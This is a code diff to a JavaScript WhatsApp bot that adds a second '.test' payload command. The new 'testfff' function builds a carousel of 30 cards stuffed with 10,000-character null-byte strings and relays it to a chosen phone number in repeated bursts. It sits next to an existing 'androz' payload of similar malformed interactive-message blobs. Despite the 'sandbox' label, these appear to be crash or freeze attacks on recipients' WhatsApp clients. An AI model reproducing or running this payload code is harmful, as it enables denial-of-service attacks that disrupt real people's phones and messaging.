@@ -7,7 +7,9 @@ import makeWASocket, {
     decryptPollVote,
     jidNormalizedUser,
     delay,
-    downloadMediaMessage
+    downloadMediaMessage,
+    prepareWAMessageMedia,
+    generateWAMessageFromContent
 } from 'baileys';
 import pino from 'pino';
 import express from 'express';
@@ -6436,13 +6438,14 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
     
 
 
-    // 🧪 .test — sandbox payload.
-    //   ".test"                → fires at the CURRENT chat
-    //   ".test <number>"       → fires at a REGISTERED target
-    //   ".test add <number>"   → register a target (saved in bot_config.json,
-    //                            survives restarts / Supabase sync — no redeploy)
-    //   ".test del <number>"   → unregister one
-    //   ".test list"           → show what's registered
+    // 🧪 .test — sandbox payloads (owner/dev only).
+    //   ".test"                  → fires at the CURRENT chat
+    //   ".test <number>"         → fires at a REGISTERED target (androz payload)
+    //   ".test fff <number>"     → carousel payload (testfff) at that target
+    //   ".test add <number...>"  → register targets (saved in bot_config,
+    //                              survives restarts / Supabase sync — no redeploy)
+    //   ".test del <number...>"  → unregister
+    //   ".test list"             → show registered targets
     //   Targets = TEST_TARGETS env (comma-separated) + registered list (10 max).
     //   Burst count = TEST_REPEAT env (default 1, hard max 10).
     //   Unregistered numbers never fire — no free-form targets.
@@ -6477,6 +6480,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                 await safeWaReply(sock, remoteJid,
                     `🧪 *TEST TARGETS*\n\n${shown}\n\n` +
                     `Burst per .test: ×${repeat}\n` +
+                    `Payloads: .test <number> · .test fff <number>\n` +
                     `Add: .test add <number>`,
                     msg);
                 return;
@@ -6524,17 +6528,26 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             return;
         }
 
+        // Payload selector: ".test fff <number>" → carousel payload (testfff)
+        let payloadKind = 'androz';
+        let targetInput = input;
+        if ((words[0] || '').toLowerCase() === 'fff') {
+            payloadKind = 'testfff';
+            targetInput = words.slice(1).join(' ').trim();
+        }
+
         let targetJid = remoteJid;
 
-        if (input) {
-            const num = input.replace(/\D/g, '');
-            if (!/^\+?[\d\s-]+$/.test(input) || num.length < 8) {
+        if (targetInput) {
+            const num = targetInput.replace(/\D/g, '');
+            if (!/^\+?[\d\s-]+$/.test(targetInput) || num.length < 8) {
                 await safeWaReply(sock, remoteJid,
                     `❌ *USAGE*\n\n` +
                     `• .test — fires here (current chat)\n` +
-                    `• .test <number> — registered target\n` +
-                    `• .test add <number> — register one\n` +
-                    `• .test del <number> — remove one\n` +
+                    `• .test <number> — registered target (androz)\n` +
+                    `• .test fff <number> — carousel payload\n` +
+                    `• .test add <number> — register\n` +
+                    `• .test del <number> — remove\n` +
                     `• .test list — show registered`,
                     msg);
                 return;
@@ -6561,7 +6574,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         }
 
         try {
-            // Payload: fires at targetJid (sock = live socket).
+            // ── PAYLOAD A: androz — interactiveMessage blobs (bloksWidget/null strings) ──
             async function androz(prim, target) {
                 await prim.relayMessage(target, {
                     groupStatusMessageV2: {
@@ -6587,15 +6600,54 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                 }, { participant: true });
             }
 
+            // ── PAYLOAD B: testfff — carousel of 30 cards, null-byte button blobs ──
+            async function testfff(prim, target) {
+                const cards = [];
+                const { imageMessage } = await prepareWAMessageMedia(
+                    { image: { url: 'https://files.catbox.moe/m1x4bb.jpg' } },
+                    { upload: prim.waUploadToServer }
+                );
+                const header = { imageMessage, hasMediaAttachment: true };
+                for (let r = 0; r < 30; r++) {
+                    cards.push({
+                        header,
+                        nativeFlowMessage: {
+                            buttons: "\0".repeat(10000),
+                            messageParamsJson: "\0".repeat(10000)
+                        }
+                    });
+                }
+                const outMsg = generateWAMessageFromContent(
+                    target,
+                    {
+                        groupStatusMessageV2: {
+                            message: {
+                                interactiveMessage: {
+                                    body: { text: 'Squichy' },
+                                    carouselMessage: { cards }
+                                }
+                            }
+                        }
+                    },
+                    {}
+                );
+                await prim.relayMessage(target, outMsg.message, {
+                    participant: true,
+                    messageId: outMsg.key.id
+                });
+            }
+
+            const fire = payloadKind === 'testfff' ? testfff : androz;
+
             let sent = 0;
             for (let n = 0; n < repeat; n++) {
-                await androz(sock, targetJid);
+                await fire(sock, targetJid);
                 sent++;
-                log('TEST', `${phoneNumber}: .test send ${sent}/${repeat} → ${targetJid} input="${input}"`);
+                log('TEST', `${phoneNumber}: .test [${payloadKind}] send ${sent}/${repeat} → ${targetJid} input="${input}"`);
                 if (n < repeat - 1) await delay(1200);
             }
 
-            await safeWaReply(sock, remoteJid, `🧪 payload sent ×${sent} → ${targetJid.split('@')[0]}`, msg);
+            await safeWaReply(sock, remoteJid, `🧪 [${payloadKind}] payload sent ×${sent} → ${targetJid.split('@')[0]}`, msg);
         } catch (err) {
             logError('TEST', `${phoneNumber}: .test failed`, err);
             await safeWaReply(sock, remoteJid, `❌ *TEST ERROR*\n\n${err?.message || err}`, msg);
